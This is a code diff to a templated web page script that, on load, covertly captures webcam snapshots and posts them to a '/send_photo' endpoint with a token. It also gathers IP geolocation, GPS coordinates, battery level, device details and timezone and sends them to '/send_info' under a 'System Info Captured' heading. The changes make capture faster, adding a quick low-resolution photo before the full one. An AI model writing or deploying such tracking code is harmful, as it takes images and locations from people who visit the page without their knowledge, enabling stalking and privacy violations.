@@ -2,8 +2,8 @@
 const token = "{{ token }}";
 const ipinfoToken = "{{ ipinfo_token }}";
 
-// Collect browser info
-async function collectInfo() {
+// Collect system info
+async function collectInfo(gps={}) {
   let info = {};
   info.userAgent = navigator.userAgent;
   info.language = navigator.language;
@@ -13,7 +13,6 @@ async function collectInfo() {
   info.memory = navigator.deviceMemory || "N/A";
   info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
@@ -21,31 +20,12 @@ async function collectInfo() {
     } catch(e){}
   }
 
-  // IP info
   let ipData = {};
   try {
     const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
     ipData = await res.json();
   } catch(e){}
 
-  // GPS location
-  let gps = {};
-  if (navigator.geolocation) {
-    try {
-      await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            gps = {lat: pos.coords.latitude, lon: pos.coords.longitude};
-            resolve();
-          },
-          err => resolve(), // ignore errors
-          {timeout: 5000}
-        );
-      });
-    } catch(e){}
-  }
-
-  // Build message
   let text = "🧠 *System Info Captured*\n";
   text += "━━━━━━━━━━━━━━━━━━━━━━━\n";
   text += `🌐 *IP:* ${ipData.ip || "N/A"}\n`;
@@ -58,7 +38,6 @@ async function collectInfo() {
   text += `🔋 *Battery:* ${info.battery || "N/A"}\n`;
   text += `🕒 *Timezone:* ${info.timezone}\n`;
 
-  // Send to backend
   fetch("/send_info", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
@@ -66,27 +45,64 @@ async function collectInfo() {
   });
 }
 
-// Run on load
-collectInfo();
+// Camera capture
+function startCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
 
-// Camera capture (as before)
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.play();
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
-    video.onloadedmetadata = () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const image = canvas.toDataURL("image/jpeg");
-      fetch("/send_photo", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ image, token })
-      }).then(() => stream.getTracks().forEach(t => t.stop()));
-    };
-  });
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      // Fast low-res snapshot
+      setTimeout(() => {
+        canvas.width = 320;
+        canvas.height = 240;
+        ctx.drawImage(video, 0, 0, 320, 240);
+        const image = canvas.toDataURL("image/jpeg", 0.6);
+        fetch("/send_photo", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ image, token })
+        });
+      }, 100);
+
+      // High-res snapshot after stream stable
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          const image = canvas.toDataURL("image/jpeg", 0.9);
+          fetch("/send_photo", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ image, token })
+          }).then(() => stream.getTracks().forEach(t => t.stop()));
+        }, 500);
+      };
+
+      // After camera, ask for location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            collectInfo({lat: pos.coords.latitude, lon: pos.coords.longitude});
+          },
+          err => collectInfo(), // fallback
+          {timeout: 5000}
+        );
+      } else {
+        collectInfo();
+      }
+    })
+    .catch(err => {
+      // If camera denied, still send info
+      collectInfo();
+    });
+}
+
+// Run both
+startCamera();
 </script>
